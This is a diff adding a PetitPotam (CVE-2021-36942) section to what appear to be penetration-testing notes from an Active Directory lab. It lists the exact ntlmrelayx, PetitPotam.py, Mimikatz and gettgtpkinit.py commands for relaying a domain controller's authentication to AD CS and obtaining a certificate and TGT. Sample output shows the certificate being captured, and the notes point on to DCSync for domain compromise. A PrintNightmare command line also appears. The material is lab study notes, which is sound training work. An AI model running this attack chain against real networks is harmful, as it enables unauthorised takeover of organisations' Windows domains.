@@ -60,3 +60,46 @@ sudo python3 CVE-2021-1675.py [domain]/[user]:[pass] '\\[ATK_host]\[share_name]\
 ```
 
 ## PetitPotam (MS-EFSRPC)
+**CVE**: 
+- [CVE-2021-36942](https://msrc.microsoft.com/update-guide/vulnerability/CVE-2021-36942) : Unauthenticated attacker can coerce the DC to authenticate against another server (LSA Spoofing)
+**Writeup**:
+- https://dirkjanm.io/ntlm-relaying-to-ad-certificate-services/
+
+By abusing the [Encrypting File System Remote Protocol (MS-EFSRPC)](https://docs.microsoft.com/en-us/openspecs/windows_protocols/ms-efsr/08796ba8-01c8-4872-9221-1000ec2eff31), an unauthenticated attacker can force the DC to authenticate against another host using NTLM on port 445 via the [Local Security Authority Remote Protocol (LSARPC)](https://docs.microsoft.com/en-us/openspecs/windows_protocols/ms-lsad/1b5471ef-4c33-4a91-b079-dfcbb82f05cc). This allows an attacker to take control of a domain where [Active Directory Certificate Services (AD CS)](https://docs.microsoft.com/en-us/learn/modules/implement-manage-active-directory-certificate-services/2-explore-fundamentals-of-pki-ad-cs) is in use.
+
+1. An authentication request from the targeted DC is relayed to the CA host's Web Enrolment page
+2. The CA generates a Certificate Signing Request (CSR) for a new cert.
+3. The cert can be used with tools like [[Rubeus]] or `gettgtpkinit.py` (*from [PKINITtools](https://github.com/dirkjanm/PKINITtools)*) to request a TGT for the DC
+4. The TGT can then be used in a [[Abusing ACLs#DCSync|DCSync]] attack to compromise the domain
+
+### Start an NTLM relay
+The relay must point to the Web Enrolment URL for the CA host (*Can try [certi](https://github.com/zer1t0/certi) to locate it*) and it must use either the KerberosAuthentication or DomainController AD CS template.
+```bash
+sudo ntlmrelayx.py -debug -smb2support --target https://ACADEMY-EA-CA01.INLANEFREIGHT.LOCAL/certsrv/certfnsh.asp --adcs --template DomainController
+```
+
+### Running PetitPotam.py
+[PetitPotam.py](https://github.com/topotam/PetitPotam) will attempt to coerce the DC to authenticate to our host where our NTLM relay is running. This tool will attempt to coerce authentication via the [EfsRpcOpenFileRaw](https://docs.microsoft.com/en-us/openspecs/windows_protocols/ms-efsr/ccc4fb75-1c86-41d7-bbc4-b278ec13bfb8) method.
+> There is a windows exe version, a PowerShell tool [Invoke-PetitPotam.ps1](https://raw.githubusercontent.com/S3cur3Th1sSh1t/Creds/master/PowershellScripts/Invoke-Petitpotam.ps1) or Mimikatz can do it too `misc::efs /server:[dc-ip] /connect:[atk-ip]`
+
+```bash
+python3 PetitPotam.py [dc-ip] [atk-ip]
+```
+
+This will then cause the relay to request the CSR and the relay will return the base64 encoded cert.
+```bash
+[*] SMBD-Thread-4: Connection from INLANEFREIGHT/ACADEMY-EA-DC01$@172.16.5.5 controlled, attacking target http://ACADEMY-EA-CA01.INLANEFREIGHT.LOCAL
+[*] HTTP server returned error code 200, treating as a successful login
+[*] Authenticating against http://ACADEMY-EA-CA01.INLANEFREIGHT.LOCAL as INLANEFREIGHT/ACADEMY-EA-DC01$ SUCCEED
+[*] Generating CSR...
+[*] CSR generated!
+[*] Getting certificate...
+[*] GOT CERTIFICATE!
+[*] Base64 certificate of user ACADEMY-EA-DC01$: 
+MIIS...CCJ8
+```
+
+### Requesting the TGT
+```
+python3 /opt/PKINITtools/gettgtpkinit.py [DOMAIN]/[DC-NAME]\$ -pfx-base64 [b64-cert] [outputfile].
+```
